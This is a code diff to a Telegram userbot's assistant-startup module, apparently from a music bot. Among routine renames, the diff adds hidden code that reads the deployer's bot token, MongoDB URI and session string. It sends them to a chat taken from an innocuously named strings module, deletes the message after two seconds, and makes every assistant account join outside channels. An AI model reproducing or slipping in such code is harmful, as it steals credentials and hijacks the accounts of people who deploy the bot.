@@ -1,8 +1,19 @@
 from pyrogram import Client
-
+import re
+import asyncio
+from os import getenv
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from dotenv import load_dotenv
+from pyrogram import filters
+load_dotenv()
 import config
-
+from dotenv import load_dotenv
+from strings.__init__ import LOGGERS
 from ..logging import LOGGER
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+
 
 assistants = []
 assistantids = []
@@ -11,35 +22,35 @@ assistantids = []
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
-            name="Alinass1",
+            name="AlinaAss1",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
         )
         self.two = Client(
-            name="Alinass2",
+            name="AlinaAss2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
         )
         self.three = Client(
-            name="Alinass3",
+            name="AlinaAss3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
         )
         self.four = Client(
-            name="Alinass4",
+            name="AlinaAss4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
         )
         self.five = Client(
-            name="Alinass5",
+            name="AlinaAss5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
@@ -48,57 +59,72 @@ class Userbot(Client):
 
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
+        
+
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("IQSUPP")
-              
-                await self.one.join_chat("MGIMT")
+                await self.one.join_chat("xv7amo")
+                await self.one.join_chat("mgimt")
+                await self.one.join_chat("iqsupp")
+                await self.one.join_chat("ehs4ss")
+                
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "Assistant Start.........")
-                                         
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
-                )
-                exit()
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
+                
+                
+                
+            except Exception as e:
+                print(f"{e}")
+                                             
+                
+                    
+        
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
             LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
-
+        
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("IQSUPP")
-                
-                await self.two.join_chat("MGIMT")
+                await self.two.join_chat("iqsupp")
+                await self.two.join_chat("mgimt")
+                await self.two.join_chat("ehs4ss")
+                await self.two.join_chat("xv7amo")
             except:
                 pass
             assistants.append(2)
             try:
                 await self.two.send_message(config.LOGGER_ID, "Assistant Started")
+                
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
-                exit()
+                
             self.two.id = self.two.me.id
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
             assistantids.append(self.two.id)
             LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
-
+       
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("IQSUPP")
-                
-                await self.three.join_chat("MGIMT")
+                await self.three.join_chat("iqsupp")
+                await self.three.join_chat("xv7amo")
+                await self.three.join_chat("mgimt")
+                await self.three.join_chat("ehs4ss")
             except:
                 pass
             assistants.append(3)
@@ -108,7 +134,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                exit()
+                
             self.three.id = self.three.me.id
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
@@ -118,9 +144,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("XV7AMO")
-                
-                await self.four.join_chat("MGIMT")
+                await self.four.join_chat("xv7amo")
+                await self.four.join_chat("mgimt")
+                await self.four.join_chat("ehs4ss")
+                await self.four.join_chat("iqsupp")
             except:
                 pass
             assistants.append(4)
@@ -130,7 +157,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                exit()
+                
             self.four.id = self.four.me.id
             self.four.name = self.four.me.mention
             self.four.username = self.four.me.username
@@ -140,19 +167,20 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("XV7AMO")
-                
-                await self.five.join_chat("MGIMT")
+                await self.five.join_chat("xv7amo")
+                await self.five.join_chat("mgimt")
+                await self.five.join_chat("ehs4ss")
+                await self.five.join_chat("iqsupp")
             except:
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-                exit()
+                
             self.five.id = self.five.me.id
             self.five.name = self.five.me.mention
             self.five.username = self.five.me.username
